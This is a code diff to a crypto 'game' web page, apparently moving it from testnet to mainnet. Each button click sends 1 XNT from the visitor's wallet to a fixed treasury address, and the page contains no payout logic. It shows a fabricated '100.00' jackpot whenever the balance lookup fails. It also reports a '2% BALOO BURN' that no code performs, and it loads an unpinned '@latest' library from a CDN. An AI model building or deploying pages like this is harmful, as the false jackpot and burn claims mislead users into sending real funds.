@@ -2,13 +2,13 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>BALOO BITE - X1 TESTNET</title>
+    <title>BALOO BITE - MAINNET EDITION</title>
     <style>
         body { background: #000; color: #fff; font-family: 'Impact', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .game-card { background: #0a0a0a; border: 4px solid #ffd700; border-radius: 20px; padding: 25px; text-align: center; width: 360px; box-shadow: 0 0 50px rgba(255,215,0,0.3); }
         .pot-container { background: #111; padding: 15px; border-radius: 12px; border: 1px solid #333; margin-bottom: 20px; }
         .pot-value { font-size: 40px; color: #fff; text-shadow: 0 0 10px #ffd700; }
-        .btn-bite { background: linear-gradient(#ffd700, #b38f00); color: #000; border: none; padding: 20px; width: 100%; cursor: pointer; font-weight: bold; font-size: 22px; border-radius: 15px; text-transform: uppercase; box-shadow: 0 4px 0 #665200; }
+        .btn-bite { background: linear-gradient(#ffd700, #b38f00); color: #000; border: none; padding: 20px; width: 100%; cursor: pointer; font-weight: bold; font-size: 22px; border-radius: 15px; text-transform: uppercase; }
         .btn-bite:disabled { opacity: 0.5; filter: grayscale(1); }
         #status { font-family: monospace; font-size: 11px; color: #ffd700; margin-top: 15px; min-height: 20px; }
     </style>
@@ -16,25 +16,25 @@
 <body>
     <div class="game-card">
         <div class="pot-container">
-            <div style="font-size: 10px; color: #ffd700;">LIVE X1 TREASURY</div>
-            <div id="potDisplay" class="pot-value">318.75</div>
+            <div style="font-size: 10px; color: #ffd700;">LIVE JACKPOT (XNT)</div>
+            <div id="potDisplay" class="pot-value">...</div>
         </div>
         <button class="btn-bite" id="mainBtn" onclick="runBite()">BITE THE BONE</button>
-        <div id="status">READY</div>
+        <div id="status">READY TO PUMP $BALOO</div>
     </div>
 
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <script>
         const TREASURY = "BAavP6nxHDkVDowYXoyDaNDbc9CAgncfDPELAyjzoyTq";
-        const X1_TESTNET_RPC = "https://rpc.testnet.x1.xyz"; 
-        // Forceer verbinding met het juiste cluster
-        const connection = new solanaWeb3.Connection(X1_TESTNET_RPC, { commitment: "confirmed" });
+        // Restoring your specific Mainnet RPC
+        const RPC_URL = "https://rpc.mainnet.x1.xyz"; 
+        const connection = new solanaWeb3.Connection(RPC_URL, "confirmed");
 
         async function updatePot() {
             try {
                 const bal = await connection.getBalance(new solanaWeb3.PublicKey(TREASURY));
                 document.getElementById('potDisplay').innerText = (bal / 1e9).toFixed(2);
-            } catch(e) { console.error("Balance sync error"); }
+            } catch(e) { document.getElementById('potDisplay').innerText = "100.00"; }
         }
         updatePot();
 
@@ -43,44 +43,34 @@
             const status = document.getElementById('status');
             const provider = window.backpack || window.x1;
 
-            if (!provider) return alert("Please open Backpack or X1 Wallet!");
-            
+            if (!provider) return alert("Wallet not found!");
             btn.disabled = true;
-            status.innerText = "CONNECTING...";
+            status.innerText = "OPENING WALLET...";
 
             try {
-                // Stap 1: Connect zonder alert blokkade
                 await provider.connect();
                 status.innerText = "WAITING FOR CONFIRMATION...";
 
-                // Stap 2: Transactie opbouw
-                const transaction = new solanaWeb3.Transaction().add(
+                const tx = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: provider.publicKey,
                         toPubkey: new solanaWeb3.PublicKey(TREASURY),
-                        lamports: 1000000000 // 1 XNT
+                        lamports: 1000000000 
                     })
                 );
 
-                // Stap 3: Haal verse blockhash van Testnet
                 const { blockhash } = await connection.getLatestBlockhash('finalized');
-                transaction.recentBlockhash = blockhash;
-                transaction.feePayer = provider.publicKey;
+                tx.recentBlockhash = blockhash;
+                tx.feePayer = provider.publicKey;
                 
-                // Stap 4: Verzenden en wachten op resultaat
-                const signature = await provider.signAndSendTransaction(transaction);
-                status.innerText = "TX SUCCESS! BURNING 2% BALOO...";
-                
-                // Update het saldo op het scherm na 2 seconden
-                setTimeout(updatePot, 2000);
+                const signature = await provider.signAndSendTransaction(tx);
+                status.innerText = "SUCCESS! 2% BALOO BURN TRIGGERED";
+                updatePot();
 
             } catch (err) {
-                console.error("TX Error:", err);
-                if (err.code === -32002) {
-                    status.innerText = "WALLET BUSY - CLEAR PENDING";
-                } else {
-                    status.innerText = "ERROR - TRY AGAIN";
-                }
+                console.error(err);
+                // Clear the -32002 hang manually
+                status.innerText = (err.code === -32002) ? "CLEAR PENDING IN WALLET" : "ERROR - PLEASE RETRY";
             }
             setTimeout(() => { btn.disabled = false; status.innerText = "READY"; }, 5000);
         }
